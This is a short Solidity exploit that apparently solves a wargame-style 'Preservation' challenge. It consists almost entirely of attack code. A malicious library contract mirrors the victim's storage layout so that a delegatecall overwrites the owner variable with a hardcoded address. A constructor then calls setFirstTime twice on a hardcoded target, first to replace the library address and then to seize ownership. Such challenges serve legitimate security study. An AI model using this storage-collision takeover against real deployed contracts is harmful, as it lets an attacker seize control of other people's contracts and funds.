
interface Preservation {
    function setFirstTime(uint256 _time) external;
}


contract HackedLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = 0xb8558fba797321E4fF69a772664Da86B8C9fB0A3;
    }
}



contract NotWellPreserved {

    constructor() {
        Preservation p = Preservation(0x5f8351Fc725452a2DA291999EE0Cd53815c41d9C);
        
        p.setFirstTime(uint256(uint160(0xa75aDC57800592eB769c01DF4bBe2F588d37b5F6)));
        p.setFirstTime(0);

    }
}